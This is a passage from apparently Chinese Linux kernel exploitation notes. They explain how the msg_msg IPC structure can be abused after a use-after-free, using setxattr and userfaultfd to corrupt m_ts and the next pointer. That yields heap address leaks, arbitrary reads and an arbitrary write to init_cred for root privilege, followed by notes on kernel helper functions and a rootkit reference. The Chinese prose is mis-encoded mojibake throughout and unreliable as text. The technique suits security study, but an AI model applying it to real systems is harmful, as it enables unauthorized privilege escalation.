//å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†\n\talen = min(len, DATALEN_MSG);\n\tif (copy_from_user(msg + 1, src, alen))\n\t\tgoto out_err;\n\n    //éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tsrc = (char __user *)src + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_from_user(seg + 1, src, alen))\n\t\t\tgoto out_err;\n\t}\n\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\n\treturn msg;\n\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾\n\n```\nmsgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)->SYS_msgrcv()->ksys_msgrcv()->do_msgrcv()->do_msg_fill()->store_msg()\n```\n\né¦–å…ˆå…³æ³¨ä¸€ä¸‹`do_msgrcv()`å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦\n\n```c\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,\n                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))\n{\n    int mode;\n    struct msg_queue *msq;\n    struct ipc_namespace *ns;\n    struct msg_msg *msg, *copy = NULL;\n    DEFINE_WAKE_Q(wake_q);\n    //....\n    if (msqid < 0 || (long) bufsz < 0)\n        return -EINVAL;\n    //è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink\n    if (msgflg & MSG_COPY) {\n        //ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™\n        if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))\n            return -EINVAL;\n        //è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg\n        //ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†\n        //ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰\n        copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));\n        /*\n        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)\n        {\n            struct msg_msg *copy;\n            \n            copy = load_msg(buf, bufsz);\n            if (!IS_ERR(copy))\n                copy->m_ts = bufsz;\n            return copy;\n        }\n        */\n        if (IS_ERR(copy))\n            return PTR_ERR(copy);\n    }\n    //è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤\n    //åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º\n    //......\n    //å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg\n    for (;;) {\n        //.....\n        msg = find_msg(msq, &msgtyp, mode);\n        if (!IS_ERR(msg)) {\n            /*\n\t\t\t * Found a suitable message.\n\t\t\t * Unlink it from the queue.\n\t\t\t */\n            //æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†\n            if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n                msg = ERR_PTR(-E2BIG);\n                goto out_unlock0;\n            }\n            /*\n\t\t\t * If we are copying, then do not unlink message and do\n\t\t\t * not update queue parameters.\n\t\t\t */\n            //è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg\n            if (msgflg & MSG_COPY) {\n                //è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª\n                msg = copy_msg(msg, copy);\n                goto out_unlock0;\n            }\n\n            //ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†\n            list_del(&msg->m_list);\n            msq->q_qnum--;\n            msq->q_rtime = ktime_get_real_seconds();\n            ipc_update_pid(&msq->q_lrpid, task_tgid(current));\n            msq->q_cbytes -= msg->m_ts;\n            atomic_sub(msg->m_ts, &ns->msg_bytes);\n            atomic_dec(&ns->msg_hdrs);\n            ss_wakeup(msq, &wake_q, false);\n\n            goto out_unlock0;\n        }\n        //....\n    }\n\nout_unlock0:\n    ipc_unlock_object(&msq->q_perm);\n    wake_up_q(&wake_q);\nout_unlock1:\n    rcu_read_unlock();\n    //å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—\n    if (IS_ERR(msg)) {\n        free_copy(copy);\n        return PTR_ERR(msg);\n    }\n    //è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶\n    bufsz = msg_handler(buf, msg, bufsz);\n    //æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾\n    free_msg(msg);\n\n    return bufsz;\n}\n\n```\n\n##### A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–\n\nä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨`msg_msg`è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ`MSG_COPY`è¿™ä¸ª`msgflg`æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„`unlink`è§¦å‘é”™è¯¯ã€‚\n\n```c\n//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„\n/* If we are copying, then do not unlink message and do\n    * not update queue parameters.\n    */\nif (msgflg & MSG_COPY) {\n    msg = copy_msg(msg, copy);\n    goto out_unlock0;\n}\n\n//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„\nlist_del(&msg->m_list);\nmsq->q_qnum--;\nmsq->q_rtime = ktime_get_real_seconds();\nipc_update_pid(&msq->q_lrpid, task_tgid(current));\nmsq->q_cbytes -= msg->m_ts;\natomic_sub(msg->m_ts, &ns->msg_bytes);\natomic_dec(&ns->msg_hdrs);\nss_wakeup(msq, &wake_q, false);\n\ngoto out_unlock0;\n```\n\nä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®`CONFIG_CHECKPOINT_RESTORE=y`æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„\n\n```c\n//v5.11 /ipc/msgutil.c\n#ifdef CONFIG_CHECKPOINT_RESTORE\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\t//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶\n}\n#else\n//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\treturn ERR_PTR(-ENOSYS);\n}\n#endif\n```\n\nğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„`v5.11`ä¸­ï¼Œ`MSG_NOERROR`å’Œ`MSG_COPY`ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº`copy_msg()`å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š\n\n![image-20220512163536660](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png)\n\næ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–`rdi(msg)`å’Œ`rsi(copy)`å¯¹åº”çš„`m_ts`è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ`copy`çš„`m_ts`æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„`msg`çš„`m_ts`é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚\n\n##### B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–\n\nåŒç†å¦‚æœä¸æŒ‡å®š`MSG_COPY`è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„`mtype`å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„`msgtpy`æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚\n\n##### C.æ•°æ®å¤åˆ¶\n\nä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯`MSG_NOERROR`å’Œ`MSG_COPY`è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦`size`å°äºé€šè¿‡`find_msg()`å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„`m_ts`ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾\n\n```c\nbufsz = msg_handler(buf, msg, bufsz);\nfree_msg(msg);\n```\n\n### (3)åˆ©ç”¨\n\n#### è¶Šç•Œè¯»å–\n\nè¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„`double-free/UAF`ï¼Œå¹¶ä¸”å†ä½¿ç”¨`setxattr`æ¥å¯¹`msg_msgmsg`ä¸­çš„`m_ts`è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨`msgrcv`çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚\n\n**ä½¿ç”¨`setxattr`çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·**\n\nä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª`msg_queue`å’Œå•ä¸ª`msg_msg`çš„å†…å­˜æ¨¡å‹\n\n![image-20220511113542467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png)\n\nå¯ä»¥çœ‹åˆ°å•ä¸ª`msg_msg`åœ¨`msg_queue`çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡`msgget`å’Œ`msgsnd`å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª`msg_msg`ç»“æ„ä½“çš„`msg_queue`ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª`msg_msg`çš„å¤´éƒ¨äº†\n\nè€Œå•ä¸ª`msg_msg`ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘`msg_queue`çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º`msg_queue`çš„å †åœ°å€äº†ã€‚\n\n\n\n#### ä»»æ„è¯»å–\n\nå®Œæˆä¸Šè¿°æ³„éœ²`msg_queue`çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°`msg_msg`çš„å†…å­˜å¸ƒå±€äº†\n\nç”±äºæˆ‘ä»¬çš„`msg_msg`æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹\n\n![5IcVxRaFQtg3HCW](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png)\n\nç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š\n\n```c\n//v4.9----ipc/msgutil.c\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n#define DATALEN_SEG\t((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))\n----------------------------------------------------------------\nint store_msg(void __user *dest, struct msg_msg *msg, size_t len)\n{\n\tsize_t alen;\n\tstruct msg_msgseg *seg;\n\n\talen = min(len, DATALEN_MSG);\n\tif (copy_to_user(dest, msg + 1, alen))\n\t\treturn -1;\n\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tdest = (char __user *)dest + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_to_user(dest, seg + 1, alen))\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n```\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹`next`æŒ‡é’ˆå’Œ`m_ts`ï¼Œç»“åˆè¯»å–`msg`æœ€ç»ˆè°ƒç”¨å‡½æ•°`store_msg`çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚\n\né‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°`msg_queue`ä¹‹åï¼Œå¯ä»¥å†å°†`msg_msg`çš„nextæŒ‡é’ˆæŒ‡å›`msg_queue`ï¼Œè¯»å‡ºå…¶ä¸­çš„`msg_msg`ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚\n\nè¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ`userfaultfd`å’Œ`setxattr`é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚\n\nåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚\n\n#### ä»»æ„å†™\n\nåŒæ ·çš„ï¼Œ`msg_msg`ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ`msgsnd`ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨`userfaultfd`åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚`init_cred`ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚\n\n\n\n# åã€å¸¸è§å‡½æ•°æ€»ç»“\n\n## `printk`:\n\n```c\nprintk(æ—¥å¿—çº§åˆ« \"æ¶ˆæ¯æ–‡æœ¬\");\n```\n\nå…¶ä¸­æ—¥å¿—çº§åˆ«å®šä¹‰å¦‚ä¸‹ï¼š\n\n```c\n#defineKERN_EMERG \"<0>\"/*ç´§æ€¥äº‹ä»¶æ¶ˆæ¯ï¼Œç³»ç»Ÿå´©æºƒä¹‹å‰æç¤ºï¼Œè¡¨ç¤ºç³»ç»Ÿä¸å¯ç”¨*/\n#defineKERN_ALERT \"<1>\"/*æŠ¥å‘Šæ¶ˆæ¯ï¼Œè¡¨ç¤ºå¿…é¡»ç«‹å³é‡‡å–æªæ–½*/\n#defineKERN_CRIT \"<2>\"/*ä¸´ç•Œæ¡ä»¶ï¼Œé€šå¸¸æ¶‰åŠä¸¥é‡çš„ç¡¬ä»¶æˆ–è½¯ä»¶æ“ä½œå¤±è´¥*/\n#define KERN_ERR \"<3>\"/*é”™è¯¯æ¡ä»¶ï¼Œé©±åŠ¨ç¨‹åºå¸¸ç”¨KERN_ERRæ¥æŠ¥å‘Šç¡¬ä»¶çš„é”™è¯¯*/\n#define KERN_WARNING \"<4>\"/*è­¦å‘Šæ¡ä»¶ï¼Œå¯¹å¯èƒ½å‡ºç°é—®é¢˜çš„æƒ…å†µè¿›è¡Œè­¦å‘Š*/\n#define KERN_NOTICE \"<5>\"/*æ­£å¸¸ä½†åˆé‡è¦çš„æ¡ä»¶ï¼Œç”¨äºæé†’ã€‚å¸¸ç”¨äºä¸å®‰å…¨ç›¸å…³çš„æ¶ˆæ¯*/\n#define KERN_INFO \"<6>\"/*æç¤ºä¿¡æ¯ï¼Œå¦‚é©±åŠ¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ‰“å°ç¡¬ä»¶ä¿¡æ¯*/\n#define KERN_DEBUG \"<7>\"/*è°ƒè¯•çº§åˆ«çš„æ¶ˆæ¯*/\n```\n\n## `kmalloc`:\n\n```C\nstatic inline void *kmalloc(size_t size, gfp_t flags)\n```\n\nå…¶ä¸­flagsä¸€èˆ¬è®¾ç½®ä¸ºGFP_KERNELæˆ–è€…GFP_DMAï¼Œåœ¨å †é¢˜ä¸­ä¸€èˆ¬å°±æ˜¯\n\nGFP_KERNELæ¨¡å¼ï¼Œå¦‚ä¸‹ï¼š\n\nã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€ã€€GFP_KERNEL\nã€€|â€“ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|ã€€ã€€|â€“ ä¸­æ–­å¤„ç†ç¨‹åºã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|ã€€ã€€|â€“ è½¯ä¸­æ–­ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|ã€€ã€€|â€“ Taskletã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€GFP_ATOMIC\nã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œå¯ä»¥ç¡çœ ã€€ã€€ã€€GFP_DMA | GFP_KERNEL\nã€€|â€“ ç”¨äºDMAçš„å†…å­˜ï¼Œä¸å¯ä»¥ç¡çœ ã€€ã€€GFP_DMA **|GFP_ATOMIC**\n\nå…·ä½“å¯ä»¥çœ‹\n\n[Linuxå†…æ ¸ç©ºé—´å†…å­˜ç”³è¯·å‡½æ•°kmallocã€kzallocã€vmallocçš„åŒºåˆ«ã€è½¬ã€‘ - sky-heaven - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/sky-heaven/p/7390370.html)\n\n`kzmalloc`ç±»ä¼¼ï¼Œå°±æ˜¯åˆ†é…ç©ºé—´å¹¶ä¸”å†…å­˜åˆå§‹åŒ–ä¸º0\n\n## `kfree`:\n\nè¿™ä¸ªå°±ä¸å¤šè¯´äº†ï¼Œå°±æ˜¯ç®€å•çš„é‡Šæ”¾ã€‚\n\n## `copy_from_user`:\n\n```c\ncopy_from_user(void *to, const void __user *from, unsigned long n)\n```\n\n## `copy_to_user`:\n\n```c\ncopy_to_user(void __user *to, const void *from, unsigned long n)\n```\n\nè¿™ä¸¤ä¸ªå°±ä¸è®²äº†ï¼Œé¡¾åæ€ä¹‰ã€‚\n\n# åä¸€ã€å…¶ä»–çŸ¥è¯†\n\n## 1.å†…æ ¸æ¨¡å—éšè—\n\nä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™é‡Œä¸æˆåŠŸï¼Œæ˜¾ç¤º\n\n` Unknown symbol module_mutex (err 0)`\n\nå‚è€ƒï¼š[ç®€æ˜“ Linux Rootkit ç¼–å†™å…¥é—¨æŒ‡åŒ—ï¼ˆä¸€ï¼‰ï¼šæ¨¡å—éšè—ä¸è¿›ç¨‹ææƒ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/246749#h3-7)\n\n\n\n## 2.æ–‡ä»¶ç³»ç»Ÿ\n\n### (1)SRV4æ–‡ä»¶ç³»ç»Ÿ\n\nä¹Ÿå°±æ˜¯å¸¸è§çš„cpioåç¼€çš„\n\n![image-20220330101231165](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330101231165.png)\n\nè¿™ä¸ªç›´æ¥å¸¸ç”¨è§£åŒ…æ‰“åŒ…å³å¯\n\n### (2)ext4æ–‡ä»¶ç³»ç»Ÿ\n\nlinuxä¸‹æŒ‚è½½ä¿®æ”¹å³å¯\n\n```bash\nsudo mount rootfs.ext4 mountpoint/\ncd mountpoint/\n#change somethin\ncd ../\nsudo umount ./mountpoint\n```\n\nå¸¸è§çš„initå¯åŠ¨è„šæœ¬åœ¨`/etc/init.d/rcS`ä¸­\n\n\n\n## 3.è®¾å¤‡æ“ä½œ\n\n- è·å–è®¾å¤‡ä¿¡æ¯\n\né€šè¿‡å‘½ä»¤`udevadm info -a -n /dev/tty`è·å–ç›¸å…³è®¾å¤‡ä¿¡æ¯\n\n![image-20220330171652853](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171652853.png)\n\n- ä¿®æ”¹è®¾å¤‡æƒé™\n\nå½“æˆ‘ä»¬æ— æ³•å¯¹è®¾å¤‡è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯èƒ½æ˜¯è¢«è®¾ç½®äº†æƒé™ï¼Œå¯ä»¥é€šè¿‡`/etc/udev/rules.d/`ä¸‹æŸ¥çœ‹è®¾ç½®çš„ä¸€äº›è§„åˆ™\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171342307.png)\n\næŸ¥çœ‹ç›¸å…³çš„å†…å®¹ï¼Œå³æŒ‡å®šç›¸å…³è®¾å¤‡åå¯ä»¥è®¾ç½®å…¶ç±»ä¼¼ç”¨æˆ·ç»„`GROUP`æˆ–è€…æƒé™`MODE`ç­‰å†…å®¹\n\n![image-20220330171405407](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171405407.png)\n\n- è¯»å–\n\nç›´æ¥`cat /dev/DEV_NAME`ç›¸å½“äº`open_read_close`è¿™ä¸ªè®¾å¤‡\n\n\n\n## 4.è·å–å†…æ ¸ç¬¦å·\n\nå½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ª`bzImage`æˆ–è€…æ— ç¬¦å·çš„`vmlinux`æ–‡ä»¶æ—¶ï¼Œæƒ³è¦è·å–ç¬¦å·ä¸€èˆ¬åªæœ‰ä»¥ä¸‹ä¸¤ç§\n\n### (1)å¯åŠ¨å†…æ ¸\n\næˆ‘ä»¬åˆ©ç”¨busyboxåˆ¶ä½œæ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åä½¿ç”¨qemuåŠ è½½å¯åŠ¨å†…æ ¸ï¼Œå¯åŠ¨ä¹‹ååœ¨`/proc/kallsyms`ä¿å­˜æ‰€æœ‰åœ°å€ï¼Œç›´æ¥catæŸ¥çœ‹å³å¯ã€‚\n\n### (2)ä½¿ç”¨å·¥å…·\n\næœ‰ä¸ªå·¥å…·[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)ï¼Œè¿™ä¸ªè¿˜æ˜¯å¾ˆå¥½ä½¿çš„ï¼Œå¯ä»¥ç›´æ¥è·å¾—å¸¦ç¬¦å·çš„`vmlinux`æ–‡ä»¶\n\n\n\n## 5.äº’æ–¥é”å’Œä¿¡å·é‡\n\n### (1)äº’æ–¥é”\n\nç”¨äºçº¿ç¨‹äº’æ–¥ï¼Œä¸€ä¸ªäº’æ–¥é”çš„åŠ é”å’Œè§£é”å¿…é¡»ç”±åŒä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œæ˜¯ä¸ºäº†é˜²æ­¢å¯¹ä¸€å—å†…å­˜çš„åŒæ—¶è¯»å†™ç­‰é—®é¢˜ã€‚\n\n```c\n#include<linux/mutex.h>\nstruct mutext mtx;\nmutex_init(&mtx);//åˆå§‹åŒ–äº’æ–¥é”\n\nif(mutex_lock_interruptible(&mtx))//-EINTR(é€€å‡ºè¿›ç¨‹)\n\treturn -ERESTARTSYS;//è¿›å…¥ç­‰å¾…\n//.....//\nmutex_unlock(&mtx);\n```\n\n\n\n### (2)ä¿¡å·é‡\n\nç”¨äºçº¿ç¨‹åŒæ­¥ï¼Œåˆç†ä½¿ç”¨å…¬å…±èµ„æºã€‚æ¯”å¦‚ä¸€ä¸ªèµ„æºåªæœ‰5ä»½ï¼Œæ¯å½“ä¸€ä¸ªçº¿ç¨‹è·å–è¯¥èµ„æºæ—¶ï¼Œä¿¡å·é‡å°±å‡ä¸€ï¼Œå½“5ä¸ªçº¿ç¨‹éƒ½è·å¾—è¯¥èµ„æºæ—¶ï¼Œä¿¡å·é‡å‡ä¸º0ï¼Œå…¶ä»–çº¿ç¨‹å°±ä¸èƒ½å†è·å–è¯¥èµ„æºï¼Œå¤„äºç­‰å¾…çŠ¶æ€ï¼Œé˜²æ­¢æ­»é”ã€‚\n\n```c\n#include<linux/semaphore.h>\nstruct semaphore sema;\n\nsema_init(&sema,1);//åˆå§‹åŒ–ä¿¡å·é‡ï¼Œå°†èµ„æºé‡è®¾ç½®ä¸º1\nif(down_interruptible(&sema))//-EINTR(é€€å‡ºè¿›ç¨‹)\n\treturn -ERESTARTSYS;//è¿›å…¥ç­‰å¾…\n//......//\nup(&sema)\n```\n\n\n\n## 6.ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨\n\n### 